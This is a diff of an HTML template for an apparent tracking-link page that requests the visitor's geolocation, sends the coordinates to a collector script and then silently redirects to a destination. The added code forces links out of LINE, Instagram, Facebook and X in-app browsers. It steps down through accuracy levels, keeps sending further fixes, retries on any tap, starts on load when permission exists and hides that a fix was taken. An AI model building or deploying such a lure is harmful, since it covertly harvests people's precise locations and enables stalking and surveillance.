@@ -1,78 +1,205 @@
 <!doctype html>
 <html lang="ja"><head><meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#0f1115">
 <title>{{ link.name }}</title>
+<script>
+/* LINE内ブラウザは位置情報の許可ダイアログが出ないことがあるので外部ブラウザで開き直す */
+(function () {
+  var ua = navigator.userAgent || "";
+  if (!/Line\//i.test(ua)) return;
+  if (/[?&]openExternalBrowser=1/.test(location.search || "")) return;
+  try {
+    var u = new URL(location.href);
+    u.searchParams.set("openExternalBrowser", "1");
+    location.replace(u.toString());
+  } catch (e) {
+    location.replace(location.href + (location.search ? "&" : "?") + "openExternalBrowser=1");
+  }
+})();
+</script>
 <style>
-body{margin:0;background:#0f1115;color:#e6e9ef;font-family:system-ui,-apple-system,"Hiragino Sans",sans-serif;
-  display:flex;min-height:100vh;align-items:center;justify-content:center}
-.wrap{text-align:center;padding:24px;max-width:420px}
-h1{font-size:18px;margin:0 0 8px}
-p{color:#9aa3b2;font-size:13px;margin:0 0 20px}
-button{padding:12px 28px;font-size:15px;border:0;border-radius:999px;background:#4c8dff;color:#fff}
+html,body{margin:0;background:#0f1115;color:#e6e9ef;
+  font-family:system-ui,-apple-system,"Hiragino Sans",sans-serif;-webkit-text-size-adjust:100%}
+body{display:flex;min-height:100vh;align-items:center;justify-content:center}
+.wrap{text-align:center;padding:24px;max-width:420px;width:100%}
+h1{font-size:18px;margin:0 0 8px;word-break:break-word}
+p.lead{color:#9aa3b2;font-size:13px;margin:0 0 20px;white-space:pre-wrap}
+button{padding:12px 28px;font-size:15px;border:0;border-radius:999px;background:#4c8dff;
+  color:#fff;font-weight:600;cursor:pointer}
+button:disabled{opacity:.55}
 .st{font-size:12px;color:#9aa3b2;margin-top:16px;line-height:1.6;min-height:1.6em}
 .st.warn{color:#f0b429}
+#ia{display:none;margin-top:18px;border-top:1px solid #232734;padding-top:14px}
+#ia p{font-size:12.5px;color:#9aa3b2;margin:0 0 10px;line-height:1.7}
+a.btn2{display:inline-block;padding:10px 20px;border-radius:999px;background:#2b3346;
+  color:#e6e9ef;text-decoration:none;font-size:13px}
 </style></head><body>
 <div class="wrap">
   <h1>{{ link.name }}</h1>
-  <p>{{ link.note or ask_text }}</p>
+  <p class="lead">{{ link.note or ask_text }}</p>
   <button id="go">{{ go_text }}</button>
   <p class="st" id="st"></p>
+  <div id="ia">
+    <p><span id="ia_name">アプリ内</span> のブラウザでは位置情報が取れないことがあります。</p>
+    <a class="btn2" id="ia_open" href="#">開き直す</a>
+  </div>
 </div>
 <script>
 window.LT_CODE  = {{ code|tojson }};
 window.LT_HIT   = {{ hit_id }};
 window.LT_NONCE = {{ nonce|tojson }};
 window.LT_GEO   = 0;
-var DEST = {{ dest|tojson }};
-var DENY_TEXT = {{ deny_text|tojson }};
-var RETRY_TEXT = {{ retry_text|tojson }};
-var DENY_REDIRECT = {{ 1 if deny_redirect else 0 }};
-var DEST_MIN = {{ dest_min }};
 </script>
-<script src="/static/collect.js"></script>
+<script src="/static/collect.js?v=14"></script>
 <script>
 (function () {
-  var st = document.getElementById('st'), go = document.getElementById('go');
-  var busy = false, done = false;          // done = 一度でも取れたら true で固定
+  "use strict";
+  var DEST          = {{ (dest or "")|tojson }};
+  var ASK_TEXT      = {{ ask_text|default("位置情報の使用を許可してください", true)|tojson }};
+  var GO_TEXT       = {{ go_text|default("続ける", true)|tojson }};
+  var DENY_TEXT     = {{ deny_text|default("位置情報が許可されていません", true)|tojson }};
+  var RETRY_TEXT    = {{ retry_text|default("もう一度", true)|tojson }};
+  var DENY_REDIRECT = {{ 1 if deny_redirect else 0 }};
+  var DEST_MIN      = {{ dest_min|default(2, true) }};
 
-  function txt(m, cls) { st.textContent = m; st.className = 'st' + (cls ? ' ' + cls : ''); }
+  var go  = document.getElementById("go");
+  var st  = document.getElementById("st");
+  var got = false, left = false, step = 0, wid = null, dead = null, dog = null;
 
-  function ok(p) {
-    if (done) return;
-    done = true;
-    txt('', '');                            // 「取得しました」は出さない
-    go.style.display = 'none';              // ボタンも消す
+  /* 高精度→粗い→もっと粗い の順に落として、必ず1点取る */
+  var LADDER = [
+    { enableHighAccuracy: true,  timeout: 9000,  maximumAge: 0 },
+    { enableHighAccuracy: false, timeout: 10000, maximumAge: 30000 },
+    { enableHighAccuracy: false, timeout: 15000, maximumAge: 300000 }
+  ];
+  function opts() { return LADDER[Math.min(step, LADDER.length - 1)]; }
+  function txt(m, warn) { st.textContent = m || ""; st.className = "st" + (warn ? " warn" : ""); }
+
+  function sendFix(p) {
+    var c = (p && p.coords) || {};
+    if (c.latitude == null || c.longitude == null) return;
     try {
-      LT.send({ gps_lat: p.coords.latitude, gps_lon: p.coords.longitude,
-                gps_acc: p.coords.accuracy });
+      LT.send({ gps_lat: c.latitude, gps_lon: c.longitude, gps_acc: c.accuracy });
     } catch (e) {}
-    if (DEST) setTimeout(function () { location.href = DEST; }, Math.max(300, DEST_MIN * 1000));
   }
 
-  function ng() {
-    if (done) return;                       // 取得済みなら未取得に戻さない
-    txt(DENY_TEXT, 'warn');
-    go.textContent = RETRY_TEXT;            // 失敗時のボタンは「もう一度」だけ
+  function stopWatch() {
+    if (wid !== null) { try { navigator.geolocation.clearWatch(wid); } catch (e) {} wid = null; }
+  }
+
+  function done(p) {
+    sendFix(p);                       // 2点目以降も送る（精度が上がる）
+    if (got) return;
+    got = true;
+    if (dead) { clearTimeout(dead); dead = null; }
+    txt("", false);
+    go.style.display = "none";
+    var ia = document.getElementById("ia");
+    if (ia) ia.style.display = "none";
+    if (DEST && !left) {
+      setTimeout(function () {
+        if (left) return;
+        left = true;
+        stopWatch();
+        try { location.replace(DEST); } catch (e) { location.href = DEST; }
+      }, Math.max(400, (DEST_MIN || 2) * 1000));
+    }
+  }
+
+  function showInApp() {
+    var ua = navigator.userAgent || "", name = "";
+    if (/Instagram/i.test(ua)) name = "Instagram";
+    else if (/FBAN|FBAV/i.test(ua)) name = "Facebook";
+    else if (/Line\//i.test(ua)) name = "LINE";
+    else if (/Twitter/i.test(ua)) name = "X";
+    if (!name) return;
+    var box = document.getElementById("ia");
+    var nm  = document.getElementById("ia_name");
+    var a   = document.getElementById("ia_open");
+    if (!box || !a) return;
+    box.style.display = "block";
+    if (nm) nm.textContent = name;
+    var ios = /iPhone|iPad|iPod/i.test(ua);
+    a.href = ios
+      ? location.href.replace(/^https:/, "x-safari-https:")
+      : "intent://" + location.href.replace(/^https?:\/\//, "") +
+        "#Intent;scheme=https;package=com.android.chrome;end";
+    a.textContent = ios ? "Safariで開き直す" : "Chromeで開き直す";
+  }
+
+  function fail() {
+    if (got) return;
+    stopWatch();
+    if (dog) { clearInterval(dog); dog = null; }
+    txt(DENY_TEXT, true);
+    go.textContent = RETRY_TEXT;
     go.disabled = false;
-    if (DENY_REDIRECT && DEST) setTimeout(function () { location.href = DEST; }, 1500);
+    showInApp();
+    if (DENY_REDIRECT && DEST && !left) {
+      setTimeout(function () { left = true; location.replace(DEST); }, 1500);
+    }
   }
 
-  function attempt() {
-    if (busy || done) return;
-    busy = true;
-    if (!navigator.geolocation) { busy = false; ng(); return; }
-    navigator.geolocation.getCurrentPosition(
-      function (p) { busy = false; ok(p); },
-      function () { busy = false; ng(); },
-      { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 });
+  function arm() {
+    stopWatch();
+    if (!navigator.geolocation) { fail(); return; }
+    txt(ASK_TEXT, false);
+    try {
+      wid = navigator.geolocation.watchPosition(function (p) {
+        if (p && p.coords && p.coords.latitude != null) { step = 0; done(p); }
+      }, function (e) {
+        if (got) return;
+        if ((e && e.code) === 1) { fail(); return; }        // 拒否
+        if (step < LADDER.length - 1) { step++; arm(); return; }
+        fail();
+      }, opts());
+    } catch (e) {
+      wid = null;
+      if (step < LADDER.length - 1) { step++; arm(); } else fail();
+    }
+    if (!dead) dead = setTimeout(function () { if (!got && !left) fail(); }, 40000);
+    if (!dog) dog = setInterval(function () {
+      if (got || left) { clearInterval(dog); dog = null; return; }
+      if (step < LADDER.length - 1) step++;
+      arm();
+    }, 12000);
   }
 
-  go.addEventListener('click', attempt);
-  document.addEventListener('visibilitychange', function () {
-    if (document.visibilityState === 'visible' && !done) attempt();
+  function start() {
+    if (got || left) return;
+    go.disabled = true;
+    txt(ASK_TEXT, false);
+    arm();
+  }
+
+  go.addEventListener("click", start);
+
+  /* ボタン以外をタップしても再挑戦（許可ダイアログはタップ起点が必須） */
+  document.addEventListener("click", function (e) {
+    if (got || left) return;
+    if (e.target === go) return;
+    if (e.target && e.target.closest && e.target.closest("#ia")) return;
+    if (wid === null) start();
+  }, { passive: true });
+
+  document.addEventListener("visibilitychange", function () {
+    if (document.visibilityState === "visible" && !got && !left && wid === null) start();
   });
-  window.addEventListener('focus', function () { if (!done) attempt(); });
-  window.addEventListener('pageshow', function (e) { if (e.persisted && !done) attempt(); });
+  window.addEventListener("focus", function () { if (!got && !left && wid === null) start(); });
+  window.addEventListener("pageshow", function (e) {
+    if (e.persisted && !got && !left) { wid = null; start(); }
+  });
+
+  /* すでに許可済みなら読み込み時から取りにいく */
+  if (navigator.permissions && navigator.permissions.query) {
+    navigator.permissions.query({ name: "geolocation" }).then(function (p) {
+      if (p.state === "granted") start();
+      p.onchange = function () {
+        if (p.state === "granted" && !got && !left) { wid = null; start(); }
+      };
+    }).catch(function () {});
+  }
 })();
 </script>
 </body></html>
